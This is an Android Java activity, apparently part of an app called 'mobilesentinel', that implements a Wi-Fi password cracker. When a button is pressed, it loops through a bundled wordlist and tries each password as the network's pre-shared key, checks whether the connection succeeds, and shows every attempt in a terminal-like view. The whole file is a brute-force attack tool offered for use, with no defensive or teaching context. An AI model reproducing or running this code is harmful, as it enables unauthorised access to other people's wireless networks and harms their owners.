package com.example.mobilesentinel;

import android.content.Context;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.TextView;
import android.widget.ScrollView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class WifiDetailsActivity extends AppCompatActivity {

    private TextView wifiNameTextView;
    private TextView securityTypeTextView;
    private TextView networkModeTextView;
    private TextView terminalOutput;
    private Button startWifiCrackerButton;
    private ScrollView scrollView;
    private WifiManager wifiManager;
    private Handler handler;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.wifi_details_activity);

        // Initialize UI components
        wifiNameTextView = findViewById(R.id.wifiName);
        securityTypeTextView = findViewById(R.id.securityType);
        networkModeTextView = findViewById(R.id.networkMode);
        terminalOutput = findViewById(R.id.terminalOutput);
        startWifiCrackerButton = findViewById(R.id.startWifiCrackerButton);
        scrollView = findViewById(R.id.scrollView);

        // Initialize WifiManager
        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);

        // Initialize Handler for UI updates
        handler = new Handler(Looper.getMainLooper());

        // Get WiFi data from Intent
        String wifiName = getIntent().getStringExtra("WIFI_NAME");
        String capabilities = getIntent().getStringExtra("CAPABILITIES");

        // Display WiFi information
        displayWifiInfo(wifiName, capabilities);

        // Set up button to start WiFi cracking
        startWifiCrackerButton.setOnClickListener(view -> startWiFiCrackingProcess(wifiName));
    }

    private void displayWifiInfo(String wifiName, String capabilities) {
        wifiNameTextView.setText(wifiName != null && !wifiName.isEmpty() ? wifiName : "WiFi Name Unavailable");

        if (capabilities != null) {
            if (capabilities.contains("WPA2")) {
                securityTypeTextView.setText("WPA2 (Secure)");
            } else if (capabilities.contains("WPA")) {
                securityTypeTextView.setText("WPA (Secure)");
            } else if (capabilities.contains("WEP")) {
                securityTypeTextView.setText("WEP (Less Secure)");
            } else {
                securityTypeTextView.setText("Open Network (No Security)");
            }

            if (capabilities.contains("ESS")) {
                networkModeTextView.setText("ESS (Extended Service Set)");
            } else {
                networkModeTextView.setText("Other Network Mode");
            }
        }
    }

    private void startWiFiCrackingProcess(String wifiName) {
        if (wifiName == null || wifiName.isEmpty()) {
            Toast.makeText(this, "WiFi name is missing. Unable to start cracking process.", Toast.LENGTH_SHORT).show();
            return;
        }

        // Read the wordlist from assets
        List<String> wordlist = readWordlistFromAssets();
        if (wordlist == null || wordlist.isEmpty()) {
            updateTerminalOutput("Error: Wordlist is empty or could not be read.\n");
            return;
        }

        updateTerminalOutput("Starting WiFi cracking for network: " + wifiName + "\n");

        // Start cracking process in a background thread
        new Thread(() -> {
            for (String password : wordlist) {
                final String currentPassword = password;
                handler.post(() -> updateTerminalOutput("Trying password: " + currentPassword + "\n"));

                boolean isConnected = tryConnectToWifi(wifiName, currentPassword);
                if (isConnected) {
                    handler.post(() -> {
                        updateTerminalOutput("Success! Connected to WiFi with password: " + currentPassword + "\n");
                        Toast.makeText(WifiDetailsActivity.this, "Connected to WiFi!", Toast.LENGTH_SHORT).show();
                    });
                    return; // Stop if connected
                }
            }

            handler.post(() -> updateTerminalOutput("Failed to crack the password for network: " + wifiName + "\n"));
        }).start();
    }

    private List<String> readWordlistFromAssets() {
        List<String> wordlist = new ArrayList<>();
        try {
            InputStream inputStream = getAssets().open("wordlist.txt");
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line;

            while ((line = reader.readLine()) != null) {
                wordlist.add(line.trim());
            }

            reader.close();
        } catch (IOException e) {
            updateTerminalOutput("Error reading wordlist: " + e.getMessage() + "\n");
            e.printStackTrace();
        }
        return wordlist;
    }

    private boolean tryConnectToWifi(String ssid, String password) {
        WifiConfiguration wifiConfig = new WifiConfiguration();
        wifiConfig.SSID = String.format("\"%s\"", ssid);
        wifiConfig.preSharedKey = String.format("\"%s\"", password);

        int netId = wifiManager.addNetwork(wifiConfig);
        if (netId == -1) {
            return false; // Failed to add network
        }

        wifiManager.disconnect();
        wifiManager.enableNetwork(netId, true);
        wifiManager.reconnect();

        // Simulate a delay to check connection status
        try {
            Thread.sleep(5000); // Wait for 5 seconds
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        return wifiManager.getConnectionInfo().getSSID().equals("\"" + ssid + "\"");
    }

    private void updateTerminalOutput(String message) {
        terminalOutput.append(message);
        scrollView.post(() -> scrollView.fullScroll(ScrollView.FOCUS_DOWN));
    }
}